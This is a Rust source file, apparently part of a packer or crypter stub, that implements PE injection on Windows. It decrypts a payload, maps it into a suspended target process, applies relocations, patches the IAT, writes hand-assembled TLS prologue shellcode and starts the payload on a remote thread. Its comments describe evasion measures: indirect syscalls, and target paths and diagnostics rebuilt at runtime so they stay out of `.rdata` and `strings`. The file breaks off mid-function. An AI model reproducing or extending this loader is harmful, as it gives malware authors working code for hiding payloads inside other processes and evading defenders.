// --- PE injection (technique fragment) ---
//
// Maps the decrypted payload image into a freshly created, suspended process
// and starts it at its entry point. The difference from process hollowing is
// the target: its original image is never unmapped. The payload is a *second*
// image, allocated in private memory and started on a thread of its own, while
// the target's own thread stays parked at its `CREATE_SUSPENDED` start and the
// target's image stays intact.
//
// Every kernel-facing call goes through the syscall layer's `nt_*` helpers, so
// this fragment is the same for `build.stub.syscalls.mode: none` and
// `mode: indirect`. `CreateProcessA` and
// `GetModuleHandleA`/`GetProcAddress`/`LoadLibraryA` remain Win32 imports: they
// are loader entry points, not syscalls the stub issues itself (process
// hollowing keeps the same ones).
//
// Per-build values (the target path, the wait timeout, every diagnostic) are
// substituted by `Params::render_fragment_for` with code that rebuilds the
// string at runtime, so no target path and no diagnostic ever lands in `.rdata`
// in cleartext.

use windows::core::{PCSTR, PCWSTR, PSTR};
use windows::Win32::Foundation::{BOOL, HANDLE, HMODULE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W, TH32CS_SNAPMODULE,
    TH32CS_SNAPMODULE32,
};
use windows::Win32::System::LibraryLoader::{
    GetModuleFileNameW, GetModuleHandleA, GetModuleHandleExW, GetProcAddress, LoadLibraryA,
    GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
};

/// Formats a failed `nt_*` call as `"<label> (0x<status>)"`.
///
/// `label` is substituted with a runtime reconstruction, so the diagnostic
/// text itself is never stored in the stub.
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

// --- PE constants ---
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
/// `IMAGE_OPTIONAL_HEADER.Magic` for PE32 and PE32+.
const OPTIONAL_MAGIC_PE32: u16 = 0x010B;
const OPTIONAL_MAGIC_PE32PLUS: u16 = 0x020B;

/// The machine the payload must declare: the stub's own architecture (the
/// packer rejects a mismatch at build time; this is the runtime backstop).
#[cfg(target_arch = "x86_64")]
const EXPECTED_MACHINE: u16 = 0x8664; // IMAGE_FILE_MACHINE_AMD64
#[cfg(target_arch = "x86")]
const EXPECTED_MACHINE: u16 = 0x014C; // IMAGE_FILE_MACHINE_I386

/// `IMAGE_SCN_MEM_EXECUTE` / `IMAGE_SCN_MEM_WRITE` section characteristics.
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;

/// `STATUS_TIMEOUT`: what the wait helpers return when a bounded wait elapses
/// (`WaitForSingleObject` reports the same value as `WAIT_TIMEOUT`).
const STATUS_TIMEOUT: i32 = 0x0000_0102;

/// `ThreadBasicInformation` for `NtQueryInformationThread`.
const THREAD_BASIC_INFORMATION_CLASS: i32 = 0;

/// How long to let a process that is mid-`ExitProcess` signal after its last
/// thread has finished, before the thread's own exit status is used instead.
const PROCESS_EXIT_GRACE_MS: u32 = 5_000;

/// Minimal section header view.
struct Section {
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    characteristics: u32,
}

/// Minimal PE view, filled from the decrypted file-layout image.
struct Pe {
    /// The payload's preferred base, widened to `u64` on x86 so the relocation
    /// arithmetic stays shared.
    image_base: u64,
    /// Whether the optional header is PE32+ (64-bit). Drives the
    /// data-directory offsets and the IAT slot width.
    pe32plus: bool,
    size_of_image: u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    sections: Vec<Section>,
    reloc_rva: u32,
    reloc_size: u32,
    import_rva: u32,
    import_size: u32,
    tls_rva: u32,
    tls_size: u32,
}

/// One module in the target process, as its loader list reports it.
struct TargetModule {
    /// Base name (e.g. `VCRUNTIME140.dll`).
    name: String,
    /// Image base.
    base: u64,
    /// Full path of the file the target mapped — compared with the loader's
    /// copy so a same-named but different file (a Store app's private DLL) is
    /// rejected instead of mis-resolved.
    path: String,
}

/// Everything the IAT needs: for each imported DLL, the loader's module (the
/// one `GetProcAddress` runs against) and the module list of the *target*,
/// which supplies the base each resolved address is rebased onto.
struct ImportResolution {
    /// Descriptor DLL name → the module loaded in the loader.
    modules: Vec<(String, HMODULE)>,
    /// The target's modules, keyed by their base name.
    target_modules: Vec<TargetModule>,
}

/// Maps the decrypted payload into a fresh, suspended process and returns the
/// exit code it produced.
///
/// The target path is rebuilt at runtime, so it never appears in `strings`.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    let target: String = $TARGET_DEF$;
    let pe = parse_pe(image)?;
    crate::tech_dbg!(
        "pe_injection",
        "target '{target}', payload {} bytes, preferred base 0x{:x}",
        image.len(),
        pe.image_base
    );
    let (process, thread) = inject_into_target(&target, image, &pe)?;
    let timeout_ms = $TIMEOUT_MS$;
    wait_and_exit(process, thread, timeout_ms)
}

/// Creates the target, maps the payload into it and starts the payload thread.
///
/// Returns both handles open: the caller waits on them and relays an exit
/// code.
fn inject_into_target(target: &str, image: &mut [u8], pe: &Pe) -> Result<(HANDLE, HANDLE), String> {
    let (process, main_thread, process_id) = spawn_suspended(target)?;
    // The target's own thread is never resumed: the payload runs on the thread
    // created below, which is what separates this from process hollowing's
    // thread reuse.
    let _ = crate::nt_close(main_thread);
    crate::tech_dbg!(
        "pe_injection",
        "spawned suspended target process={:#x} pid={process_id}",
        process.0 as usize
    );

    match map_payload(process, process_id, image, pe) {
        Ok(thread) => Ok((process, thread)),
        Err(error) => {
            // The syscall layer has no `NtTerminateProcess` helper, so the
            // suspended target is left behind; closing the handle is the best
            // effort available.
            let _ = crate::nt_close(process);
            Err(error)
        }
    }
}

/// Writes the payload image into the target and starts its entry point.
fn map_payload(
    process: HANDLE,
    process_id: u32,
    image: &mut [u8],
    pe: &Pe,
) -> Result<HANDLE, String> {
    // 1. Load every DLL the payload imports into the target and collect the
    //    bases the *target* mapped each module at. The addresses written into
    //    the IAT must be the target's: only the KnownDlls (and their
    //    dependencies) share one base per boot, while any other image is
    //    randomized per process.
    let resolution = load_imports_in_target(process, process_id, image, pe)?;

    // 2. Reserve the payload's image. The preferred base is passed as a hint:
    //    when it is taken the allocator returns another base, and the
    //    relocations below cover that case.
    let mut address = pe.image_base as *mut core::ffi::c_void;
    let mut region_size = pe.size_of_image as usize;
    let status = crate::nt_alloc_vm(
        process,
        &mut address,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 {
        return Err(nt_error($MSG_ALLOC_FAILED$, status));
    }
    let base = address as u64;
    crate::tech_dbg!(
        "pe_injection",
        "payload allocated at 0x{base:x} ({} bytes, preferred 0x{:x})",
        pe.size_of_image,
        pe.image_base
    );

    // 3. Rebase when the image does not sit at its preferred base. The delta is
    //    a wrapping difference, so a 32-bit image based above `i32::MAX` works
    //    too.
    let delta = base.wrapping_sub(pe.image_base);
    if delta != 0 {
        apply_relocations(image, pe, delta)?;
        crate::tech_dbg!("pe_injection", "relocations applied (delta {delta:#x})");
    }

    // 4. Resolve the payload's imports and fill its IAT *locally*, before a
    //    single byte reaches the target: a resolution failure must abort here,
    //    never leave the payload with a half-filled IAT. Each address is
    //    rebased onto the target's own mapping of the module that contains it.
    let patched = resolve_and_patch_imports(image, pe, &resolution)?;
    crate::tech_dbg!("pe_injection", "IAT patched ({patched} import(s))");

    // 5. Write the headers and every section.
    write_image(process, base, image, pe)?;

    // 6. Narrow every page to the protection its section asks for. The
    //    allocation is read-write while the image is written and only then
    //    narrowed, so no page is ever writable and executable at once.
    protect_image(process, base, pe)?;

    // 7. Start the payload on a thread of its own. Without a TLS directory the
    //    entry point runs directly; with one, the thread first runs a small
    //    prologue that sets its TLS slot and runs the payload's
    //    DLL_PROCESS_ATTACH callbacks before jumping to the entry point. The
    //    start routine returns into `RtlExitUserThread`, so a payload whose
    //    entry point returns still ends its thread cleanly.
    let entry = base + pe.entry_point_rva as u64;
    let thread = match provision_tls(process, base, image, pe)? {
        Some(provision) => start_with_tls(process, base, entry, &provision)?,
        None => start_at_entry(process, entry)?,
    };
    crate::tech_dbg!("pe_injection", "payload thread started at 0x{entry:x}");
    Ok(thread)
}

// --- Payload TLS ---
//
// `pe_injection` starts the payload on a fresh, loader-created thread, which has
// no TLS slot for the manually-mapped image. Like process hollowing, this
// reserves a real index, publishes `_tls_index` and materializes the `.tls`
// template. The slot itself cannot be written cross-process without reading the
// thread's TEB, so the work is handed to a tiny target-resident prologue the
// payload thread runs before its entry point: the prologue writes the thread's
// `ThreadLocalStoragePointer` slot for the payload's index, then runs the
// payload's `DLL_PROCESS_ATTACH` callbacks, and finally jumps to the entry
// point. The slot must be that array — `TlsSetValue` writes a different one a
// CRT does not read (measured; see `build_prologue`).

/// `TlsAlloc`'s failure value.
const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
/// Byte offset of the null-terminated callback array within the prologue page.
const CALLBACKS_OFFSET: usize = 0x200;

/// The payload's TLS directory, rebased onto the target's image base.
struct TlsInfo {
    /// Address of the DWORD the payload's CRT reads as `_tls_index`.
    index_va: u64,
    /// Address of the null-terminated callback array (0 = none).
    callbacks_va: u64,
    /// Address of the `.tls` template bytes.
    template_va: u64,
    /// Size of the template (`EndAddressOfRawData - StartAddressOfRawData`).
    template_len: usize,
    /// Zero-filled bytes that follow the template in each thread's block.
    zero_fill: usize,
}

/// Everything the TLS-aware start needs: the reserved index, the template block
/// and the relocated callbacks.
struct TlsProvision {
    index: u32,
    block: u64,
    callbacks: Vec<u64>,
}

/// Reads the payload's TLS directory out of the (relocated) image.
fn parse_tls(image: &[u8], pe: &Pe) -> Result<Option<TlsInfo>, String> {
    if pe.tls_rva == 0 || pe.tls_size == 0 {
        return Ok(None);
    }
    let dir = rva_to_offset(pe, pe.tls_rva).ok_or_else(|| $MSG_TLS_DIR_UNMAPPED$)?;
    // IMAGE_TLS_DIRECTORY: StartAddressOfRawData, EndAddressOfRawData,
    // AddressOfIndex, AddressOfCallBacks (all pointer-sized), then SizeOfZeroFill
    // and Characteristics (both 32-bit).
    #[cfg(target_arch = "x86_64")]
    let (raw_start, raw_end, index_va, callbacks_va, zero_fill) = (
        read_u64(image, dir)?,
        read_u64(image, dir + 8)?,
        read_u64(image, dir + 16)?,
        read_u64(image, dir + 24)?,
        read_u32(image, dir + 32)? as usize,
    );
    #[cfg(target_arch = "x86")]
    let (raw_start, raw_end, index_va, callbacks_va, zero_fill) = (
        read_u32(image, dir)? as u64,
        read_u32(image, dir + 4)? as u64,
        read_u32(image, dir + 8)? as u64,
        read_u32(image, dir + 12)? as u64,
        read_u32(image, dir + 16)? as usize,
    );
    Ok(Some(TlsInfo {
        index_va,
        callbacks_va,
        template_va: raw_start,
        template_len: raw_end.saturating_sub(raw_start) as usize,
        zero_fill,
    }))
}

/// Reserves a TLS index, publishes `_tls_index`, materializes the `.tls`
/// template and collects the payload's callbacks — the state the prologue needs.
fn provision_tls(
    process: HANDLE,
    base: u64,
    image: &[u8],
    pe: &Pe,
) -> Result<Option<TlsProvision>, String> {
    let Some(info) = parse_tls(image, pe)? else {
        return Ok(None);
    };

    // 1. Allocate a real index in the target: run `TlsAlloc` there and read its
    //    result back from the throwaway thread's exit status.
    let index = remote_tls_alloc(process)?;
    if index == TLS_OUT_OF_INDEXES {
        return Err($MSG_TLS_INDEX_FAILED$);
    }

    // 2. Publish it where the payload reads `_tls_index`.
    if info.index_va != 0 {
        write_remote(process, info.index_va, &index.to_le_bytes())?;
    }

    // 3. Allocate a private copy of the `.tls` template; the prologue hands it
    //    to `TlsSetValue` as this thread's block.
    let mut block: u64 = 0;
    if info.template_len + info.zero_fill > 0 {
        let mut address: *mut core::ffi::c_void = core::ptr::null_mut();
        let mut size = info.template_len + info.zero_fill;
        let status = crate::nt_alloc_vm(
            process,
            &mut address,
            0,
            &mut size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 || address.is_null() {
            return Err(nt_error($MSG_TLS_BLOCK_ALLOC_FAILED$, status));
        }
        block = address as u64;
        if info.template_len > 0 {
            let rva = info.template_va.wrapping_sub(base) as u32;
            let offset = rva_to_offset(pe, rva).ok_or_else(|| $MSG_TLS_TEMPLATE_UNMAPPED$)?;
            let end = offset
                .checked_add(info.template_len)
                .ok_or_else(|| $MSG_TLS_TEMPLATE_OOB$)?;
            if end > image.len() {
                return Err($MSG_TLS_TEMPLATE_OOB$);
            }
            write_remote(process, block, &image[offset..end])?;
        }
    }

    let callbacks = read_callback_array(image, pe, base, &info)?;
    Ok(Some(TlsProvision {
        index,
        block,
        callbacks,
    }))
}

/// Allocates a TLS index in the target by running `TlsAlloc` on a throwaway
/// remote thread and reading the index back from its exit status.
fn remote_tls_alloc(process: HANDLE) -> Result<u32, String> {
    let tls_alloc = resolve_kernel32_export($TLS_ALLOC_DEF$)?;
    let mut thread = HANDLE::default();
    let status = crate::nt_create_thread_ex(process, &mut thread, tls_alloc, 0, 0);
    if status < 0 {
        return Err(nt_error($MSG_TLSALLOC_RUN_FAILED$, status));
    }
    let status = crate::nt_wait_for_single_object(thread, u32::MAX);
    if status < 0 {
        let _ = crate::nt_close(thread);
        return Err(nt_error($MSG_TLSALLOC_UNFINISHED$, status));
    }
    let info = thread_basic_information(thread)?;
    let _ = crate::nt_close(thread);
    if info.exit_status < 0 {
        return Err(nt_error($MSG_TLSALLOC_FAILED$, info.exit_status));
    }
    Ok(info.exit_status as u32)
}

/// Writes the TLS prologue and its callback array into the target and starts
/// the payload thread on the prologue.
/// Walks the payload's null-terminated TLS callback array and returns the
/// relocated callback addresses, in order.
fn read_callback_array(
    image: &[u8],
    pe: &Pe,
    base: u64,
    info: &TlsInfo,
) -> Result<Vec<u64>, String> {
    if info.callbacks_va == 0 {
        return Ok(Vec::new());
    }
    let rva = info.callbacks_va.wrapping_sub(base) as u32;
    let mut off = rva_to_offset(pe, rva).ok_or_else(|| $MSG_TLS_CALLBACKS_UNMAPPED$)?;
    let mut callbacks = Vec::new();
    loop {
        #[cfg(target_arch = "x86_64")]
        let address = {
            let end = off
                .checked_add(8)
                .ok_or_else(|| $MSG_TLS_CALLBACKS_UNTERMINATED$)?;
            if end > image.len() {
                return Err($MSG_TLS_CALLBACKS_UNTERMINATED$);
            }
            read_u64(image, off)?
        };
        #[cfg(target_arch = "x86")]
        let address = {
            let end = off
                .checked_add(4)
                .ok_or_else(|| $MSG_TLS_CALLBACKS_UNTERMINATED$)?;
            if end > image.len() {
                return Err($MSG_TLS_CALLBACKS_UNTERMINATED$);
            }
            read_u32(image, off)? as u64
        };
        if address == 0 {
            break;
        }
        callbacks.push(address);
        #[cfg(target_arch = "x86_64")]
        {
            off += 8;
        }
        #[cfg(target_arch = "x86")]
        {
            off += 4;
        }
    }
    Ok(callbacks)
}

/// Serializes the callback list as a null-terminated array of pointers.
fn render_callback_array(callbacks: &[u64]) -> Vec<u8> {
    #[cfg(target_arch = "x86_64")]
    {
        let mut bytes = Vec::with_capacity((callbacks.len() + 1) * 8);
        for callback in callbacks {
            bytes.extend_from_slice(&callback.to_le_bytes());
        }
        bytes.extend_from_slice(&0u64.to_le_bytes());
        bytes
    }
    #[cfg(target_arch = "x86")]
    {
        let mut bytes = Vec::with_capacity((callbacks.len() + 1) * 4);
        for callback in callbacks {
            bytes.extend_from_slice(&(*callback as u32).to_le_bytes());
        }
        bytes.extend_from_slice(&0u32.to_le_bytes());
        bytes
    }
}

/// Builds the x64 prologue the payload thread runs before its entry point:
/// write the thread's TLS-array slot for the payload's index, run each callback
/// with `DLL_PROCESS_ATTACH`, then jump to the entry point.
///
/// The slot is written into `TEB->ThreadLocalStoragePointer` (`gs:[0x58]`), the
/// array a CRT reads through `_tls_index`. `TlsSetValue` writes
/// `TEB->TlsSlots`, a *different* array: a payload whose slot was set that way
/// finds a null block and its Rust TLS guard faults reading `[block+0x10]`
/// (measured on Windows 11 26200 — `0xC0000005` at address `0x10`;
/// `docs/measurements.md`).
///
/// `sub rsp, 8` around the callback loop exists for the x64 call ABI: a thread
/// start routine is entered with `rsp % 16 == 8` (as if called), so a `call`
/// issued from that state hands the callee `rsp % 16 == 0` and every frame the
/// callback builds is off by eight, until a `movaps` of a local faults
/// (`0xC0000005` at address `-1`, measured). The `add rsp, 8` restores the entry
/// state before the jump, since the payload's entry point must be entered with
/// `rsp % 16 == 8` too.
#[cfg(target_arch = "x86_64")]
fn build_prologue(
    index: u32,
    block: u64,
    callbacks_ptr: u64,
    image_base: u64,
    entry: u64,
) -> Vec<u8> {
    let mut code = Vec::with_capacity(88);
    // mov rcx, gs:[0x58]                      ; 0
    code.extend_from_slice(&[0x65, 0x48, 0x8B, 0x0C, 0x25, 0x58, 0x00, 0x00, 0x00]);
    // mov rdx, block                          ; 9
    code.extend_from_slice(&[0x48, 0xBA]);
    code.extend_from_slice(&block.to_le_bytes());
    // mov eax, index                          ; 19
    code.extend_from_slice(&[0xB8]);
    code.extend_from_slice(&index.to_le_bytes());
    // mov [rcx + rax*8], rdx                  ; 24
    code.extend_from_slice(&[0x48, 0x89, 0x14, 0xC1]);
    // mov rbx, callbacks_ptr                  ; 28
    code.extend_from_slice(&[0x48, 0xBB]);
    code.extend_from_slice(&callbacks_ptr.to_le_bytes());
    // sub rsp, 8                              ; 38
    code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x08]);
    // loop: mov rax, [rbx]                    ; 42
    code.extend_from_slice(&[0x48, 0x8B, 0x03]);
    // test rax, rax                           ; 45
    code.extend_from_slice(&[0x48, 0x85, 0xC0]);
    // je done (+26 -> 76)                     ; 48
    code.extend_from_slice(&[0x74, 26]);
    // mov rcx, image_base                     ; 50
    code.extend_from_slice(&[0x48, 0xB9]);
    code.extend_from_slice(&image_base.to_le_bytes());
    // mov edx, 1                              ; 60
    code.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
    // xor r8, r8                              ; 65
    code.extend_from_slice(&[0x4D, 0x31, 0xC0]);
    // call rax                                ; 68
    code.extend_from_slice(&[0xFF, 0xD0]);
    // add rbx, 8                              ; 70
    code.extend_from_slice(&[0x48, 0x83, 0xC3, 0x08]);
    // jmp loop (-34 -> 42)                    ; 74
    code.extend_from_slice(&[0xEB, 0xDE]);
    // done: add rsp, 8                        ; 76
    code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x08]);
    // mov rax, entry                          ; 80
    code.extend_from_slice(&[0x48, 0xB8]);
    code.extend_from_slice(&entry.to_le_bytes());
    // jmp rax                                 ; 90
    code.extend_from_slice(&[0xFF, 0xE0]);
    code
}

/// Builds the x86 prologue (stdcall): write the thread's TLS-array slot for the
/// payload's index, run each callback, then jump to the entry point.
///
/// The slot goes into `TEB->ThreadLocalStoragePointer` (`fs:[0x2C]`); see the
/// x64 variant for why `TlsSetValue` is not used.
#[cfg(target_arch = "x86")]
fn build_prologue(
    index: u32,
    block: u64,
    callbacks_ptr: u64,
    image_base: u64,
    entry: u64,
) -> Vec<u8> {
    let mut code = Vec::with_capacity(55);
    // mov ecx, fs:[0x2C]                      ; 0
    code.extend_from_slice(&[0x64, 0x8B, 0x0C, 0x25, 0x2C, 0x00, 0x00, 0x00]);
    // mov edx, block                          ; 8
    code.extend_from_slice(&[0xBA]);
    code.extend_from_slice(&(block as u32).to_le_bytes());
    // mov eax, index                          ; 13
    code.extend_from_slice(&[0xB8]);
    code.extend_from_slice(&index.to_le_bytes());
    // mov [ecx + eax*4], edx                  ; 18
    code.extend_from_slice(&[0x89, 0x14, 0x81]);
    // mov ebx, callbacks_ptr                  ; 21
    code.extend_from_slice(&[0xBB]);
    code.extend_from_slice(&(callbacks_ptr as u32).to_le_bytes());
    // loop: mov eax, [ebx]                    ; 26
    code.extend_from_slice(&[0x8B, 0x03]);
    // test eax, eax                           ; 28
    code.extend_from_slice(&[0x85, 0xC0]);
    // je done (+16 -> 48)                     ; 30
    code.extend_from_slice(&[0x74, 16]);
    // push 0 (reserved)                       ; 32
    code.extend_from_slice(&[0x6A, 0x00]);
    // push 1 (reason)                         ; 34
    code.extend_from_slice(&[0x6A, 0x01]);
    // push image_base                         ; 36
    code.extend_from_slice(&[0x68]);
    code.extend_from_slice(&(image_base as u32).to_le_bytes());
    // call eax                                ; 41
    code.extend_from_slice(&[0xFF, 0xD0]);
    // add ebx, 4                              ; 43
    code.extend_from_slice(&[0x83, 0xC3, 0x04]);
    // jmp loop (-22 -> 26)                    ; 46
    code.extend_from_slice(&[0xEB, 0xEA]);
    // done: mov eax, entry                    ; 48
    code.extend_from_slice(&[0xB8]);
    code.extend_from_slice(&(entry as u32).to_le_bytes());
    // jmp eax                                 ; 53
    code.extend_from_slice(&[0xFF, 0xE0]);
    code
}

/// Writes the TLS prologue and its callback array into the target and starts
/// the payload thread on the prologue.
fn start_with_tls(
    process: HANDLE,
    base: u64,
    entry: u64,
    provision: &TlsProvision,
) -> Result<HANDLE, String> {
    let callback_bytes = render_callback_array(&provision.callbacks);

    // One executable page holds the prologue and the null-terminated callback
    // array; the array sits at a fixed offset so the prologue's immediate is
    // known before any byte is written.
    let mut region: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut region_size = 0x1000usize;
    let status = crate::nt_alloc_vm(
        process,
        &mut region,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 || region.is_null() {
        return Err(nt_error($MSG_TLS_PROLOGUE_ALLOC_FAILED$, status));
    }
    let region = region as u64;
    let callbacks_ptr = region + CALLBACKS_OFFSET as u64;

    let prologue = build_prologue(
        provision.index,
        provision.block,
        callbacks_ptr,
        base,
        entry,
    );
    write_remote(process, region, &prologue)?;
    write_remote(process, callbacks_ptr, &callback_bytes)?;

    // Narrow the page to execute-read: the prologue runs, and both it and the
    // callback array are read; nothing here needs to be writable again.
    let mut previous = 0u32;
    let status = crate::nt_protect_vm(
        process,
        region as *mut core::ffi::c_void,
        region_size,
        PAGE_EXECUTE_READ.0,
        &mut previous,
    );
    if status < 0 {
        return Err(nt_error($MSG_TLS_PROLOGUE_PROTECT_FAILED$, status));
    }

    let mut thread = HANDLE::default();
    let status = crate::nt_create_thread_ex(process, &mut thread, region as usize, 0, 0);
    if status < 0 {
        return Err(nt_error($MSG_THREAD_FAILED$, status));
    }
    Ok(thread)
}

/// Starts the payload's entry point on a fresh thread (the no-TLS path).
fn start_at_entry(process: HANDLE, entry: u64) -> Result<HANDLE, String> {
    let mut thread = HANDLE::default();
    let status = crate::nt_create_thread_ex(process, &mut thread, entry as usize, 0, 0);
    if status < 0 {
        return Err(nt_error($MSG_THREAD_FAILED$, status));
    }
    Ok(thread)
}

// --- Minimal PE parsing (offsets relative to the decrypted image) ---

fn parse_pe(image: &[u8]) -> Result<Pe, String> {
    if image.len() < 64 {
        return Err($MSG_PAYLOAD_TOO_SMALL$);
    }
    if read_u16(image, 0)? != IMAGE_DOS_SIGNATURE {
        return Err($MSG_BAD_DOS$);
    }
    let e_lfanew = read_u32(image, 0x3C)? as usize;
    if read_u32(image, e_lfanew)? != IMAGE_NT_SIGNATURE {
        return Err($MSG_BAD_NT$);
    }

    let machine = read_u16(image, e_lfanew + 4)?;
    if machine != EXPECTED_MACHINE {
        return Err(format!("{} (machine 0x{machine:04x})", $MSG_BAD_ARCH$));
    }

    let num_sections = read_u16(image, e_lfanew + 6)? as usize;
    let size_of_optional_header = read_u16(image, e_lfanew + 20)? as usize;
    let opt = e_lfanew + 4 + 20;

    let opt_magic = read_u16(image, opt)?;
    let pe32plus = match opt_magic {
        OPTIONAL_MAGIC_PE32PLUS => true,
        OPTIONAL_MAGIC_PE32 => false,
        magic => return Err(format!("{} 0x{magic:04x}", $MSG_BAD_OPT_MAGIC$)),
    };

    // PE32+ stores `ImageBase` as a `u64` at 24 and its data directories at
    // 112; PE32 uses a `u32` at 28 and directories at 96 (reading only the low
    // half of a 64-bit base skews every relocation by 4 GB).
    let image_base = if pe32plus {
        read_u64(image, opt + 24)?
    } else {
        read_u32(image, opt + 28)? as u64
    };
    let entry_point_rva = read_u32(image, opt + 16)?;
    let size_of_image = read_u32(image, opt + 56)?;
    let size_of_headers = read_u32(image, opt + 60)?;

    // Both sizes are validated here so the later slices and remote writes
    // cannot run past the decrypted buffer or the allocation.
    if size_of_image == 0 || size_of_image < size_of_headers {
        return Err($MSG_BAD_IMAGE_SIZE$);
    }
    if size_of_headers as usize > image.len() {
        return Err($MSG_HEADERS_OOB$);
    }
    if entry_point_rva == 0 || entry_point_rva >= size_of_image {
        return Err($MSG_NO_ENTRY$);
    }

    let num_dirs = read_u32(image, opt + if pe32plus { 108 } else { 92 })?;
    let dir_base = opt + if pe32plus { 112 } else { 96 };
    // Base relocation directory (data directory index 5).
    let (reloc_rva, reloc_size) = if num_dirs > 5 {
        (
            read_u32(image, dir_base + 40)?,
            read_u32(image, dir_base + 44)?,
        )
    } else {
        (0, 0)
    };
    // Import directory (data directory index 1).
    let (import_rva, import_size) = if num_dirs > 1 {
        (
            read_u32(image, dir_base + 8)?,
            read_u32(image, dir_base + 12)?,
        )
    } else {
        (0, 0)
    };
    // TLS directory (data directory index 9).
    let (tls_rva, tls_size) = if num_dirs > 9 {
        (
            read_u32(image, dir_base + 72)?,
            read_u32(image, dir_base + 76)?,
        )
    } else {
        (0, 0)
    };

    let section_table = opt + size_of_optional_header;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = section_table + i * 40;
        if s + 40 > image.len() {
            return Err($MSG_SECTION_TABLE_OOB$);
        }
        sections.push(Section {
            virtual_size: read_u32(image, s + 8)?,
            virtual_address: read_u32(image, s + 12)?,
            size_of_raw_data: read_u32(image, s + 16)?,
            pointer_to_raw_data: read_u32(image, s + 20)?,
            characteristics: read_u32(image, s + 36)?,
        });
    }

    Ok(Pe {
        image_base,
        pe32plus,
        size_of_image,
        size_of_headers,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
        import_rva,
        import_size,
        tls_rva,
        tls_size,
    })
}

fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
    for sec in &pe.sections {
        let size = sec.virtual_size.max(sec.size_of_raw_data);
        if rva >= sec.virtual_address && rva < sec.virtual_address + size {
            return Some((rva - sec.virtual_address + sec.pointer_to_raw_data) as usize);
        }
    }
    None
}

fn apply_relocations(image: &mut [u8], pe: &Pe, delta: u64) -> Result<(), String> {
    if pe.reloc_size == 0 {
        return Ok(());
    }
    let start = rva_to_offset(pe, pe.reloc_rva).ok_or_else(|| $MSG_RELOC_TABLE_UNMAPPED$)?;
    let end = start + pe.reloc_size as usize;
    if end > image.len() {
        return Err($MSG_RELOC_TABLE_OOB$);
    }

    let mut off = start;
    while off + 8 <= end {
        let page_rva = read_u32(image, off)?;
        let block_size = read_u32(image, off + 4)?;
        if block_size < 8 || off + block_size as usize > end {
            return Err($MSG_BAD_RELOC_BLOCK$);
        }
        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry = read_u16(image, off + 8 + (i * 2) as usize)?;
            let typ = entry >> 12;
            let rva = page_rva + (entry & 0xFFF) as u32;
            let file_off = match rva_to_offset(pe, rva) {
                Some(o) => o,
                None => continue,
            };
            match typ {
                // IMAGE_REL_BASED_DIR64 (10): patch a 64-bit field. The only
                // type an x64 image emits for absolute addresses; taking it for
                // HIGHLOW silently patches just the low half of every pointer.
                10 => {
                    let v = read_u64(image, file_off)?;
                    write_u64(image, file_off, v.wrapping_add(delta))?;
                }
                // IMAGE_REL_BASED_HIGHLOW (3): patch a 32-bit field. What an
                // x86 image emits for absolute addresses.
                3 => {
                    let v = read_u32(image, file_off)?;
                    write_u32(image, file_off, (v as u64).wrapping_add(delta) as u32)?;
                }
                // ABSOLUTE and everything else: skip.
                _ => {}
            }
        }
        off += block_size as usize;
    }
    Ok(())
}

/// Resolves the payload's import table and writes the resulting *target*
/// addresses into the image's IAT (in place, so the following `write_image`
/// ships them to the target).
///
/// The shared resolver walks the import descriptors and, for every thunk,
/// calls `GetProcAddress` in the current process; the policy closure below
/// rebases each address onto the target's own mapping of the module that
/// contains it (`GetProcAddress` may return an address in *another* module —
/// `kernel32.dll` forwards exports to `kernelbase.dll`/`ntdll.dll`). Any import
/// that cannot be resolved aborts here, so a payload never starts with a
/// half-filled IAT.
fn resolve_and_patch_imports(
    image: &mut [u8],
    pe: &Pe,
    resolution: &ImportResolution,
) -> Result<usize, String> {
    let imports = crate::resolve_imports(
        image,
        pe.import_rva,
        pe.import_size,
        |rva| rva_to_offset(pe, rva),
        |dll, func| {
            let Some((_, module)) = resolution.modules.iter().find(|(name, _)| name == dll)
            else {
                return crate::ImportPolicy::Forward;
            };
            // Falling back to `Forward` on a lookup failure lets the resolver
            // report its own (accurate) resolution error instead of aborting
            // with a misleading one.
            let Some(local) = local_export(*module, func) else {
                return crate::ImportPolicy::Forward;
            };
            match target_export(local, &resolution.target_modules) {
                Some(address) => crate::ImportPolicy::Proxy(address),
                None => crate::ImportPolicy::Forward,
            }
        },
    )
    .map_err(|e| format!("{}: {e}", $MSG_RESOLVE_IMPORTS$))?;

    let count = imports.len();
    for (iat_rva, address) in imports {
        let offset = rva_to_offset(pe, iat_rva)
            .ok_or_else(|| format!("{} 0x{iat_rva:08x}", $MSG_IAT_SLOT_NOT_MAPPED$))?;
        // The slot width follows the *image*: writing 8 bytes into a 32-bit
